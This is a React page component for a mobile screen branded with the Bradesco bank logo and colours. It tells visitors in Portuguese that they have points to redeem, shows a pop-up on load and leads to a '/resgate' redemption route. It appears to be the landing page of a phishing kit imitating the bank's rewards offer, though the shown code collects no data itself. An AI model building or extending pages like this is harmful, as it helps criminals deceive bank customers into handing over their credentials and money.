import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Menu, Bell } from "lucide-react";
import AttentionModal from "@/components/AttentionModal";
import bradescoLogo from "@/assets/bradesco-logo.png";
import BottomNav from "@/components/BottomNav";

const Index = () => {
  const navigate = useNavigate();
  const [modalOpen, setModalOpen] = useState(true);
  const [toggleOn, setToggleOn] = useState(false);

  return (
    <div className="min-h-screen max-w-md mx-auto relative" style={{ background: 'linear-gradient(135deg, #D7004D 0%, #A30032 100%)' }}>
      {/* Header */}
      <div className="px-5 pt-6 pb-16">
        <div className="flex items-center justify-between mb-8">
          <Menu className="text-primary-foreground" size={24} />
          <Bell className="text-primary-foreground" size={24} />
        </div>
        <div className="flex flex-col items-center gap-3">
          <div className="text-primary-foreground text-2xl font-bold tracking-wide">
            <img src={bradescoLogo} alt="Bradesco" className="h-8" />
          </div>
          <p className="text-primary-foreground/80 text-sm">
            Você possui pontos para resgate
          </p>
        </div>
      </div>

      {/* Content */}
      <div className="px-5 -mt-6 pb-32 space-y-4">
        {/* Points Card */}
        <div className="flex items-center justify-between px-1">
          <span className="text-sm font-medium text-primary-foreground">Resgatar pontos Bradesco</span>
          <button
            onClick={() => setToggleOn(!toggleOn)}
            className={`w-12 h-7 rounded-full transition-colors relative flex-shrink-0 ${toggleOn ? "bg-primary-foreground" : "bg-primary-foreground/30"}`}
          >
            <span
              className={`absolute top-[3px] left-[3px] w-[22px] h-[22px] rounded-full shadow transition-transform ${
                toggleOn ? "translate-x-[18px] bg-[#D7004D]" : "translate-x-0 bg-primary-foreground/60"
              }`}
            />
          </button>
        </div>

        {/* CTA Button */}
        <button className="w-full py-4 rounded-full bg-white text-[#D7004D] font-semibold text-base hover:bg-white/90 transition-opacity">
          continuar para resgate
        </button>
      </div>

      {/* Bottom Navigation */}
      <BottomNav />

      {/* Attention Modal */}
      <AttentionModal
        open={modalOpen}
        onClose={() => setModalOpen(false)}
        onContinue={() => navigate("/resgate")}
      />
    </div>
  );
};

export default Index;
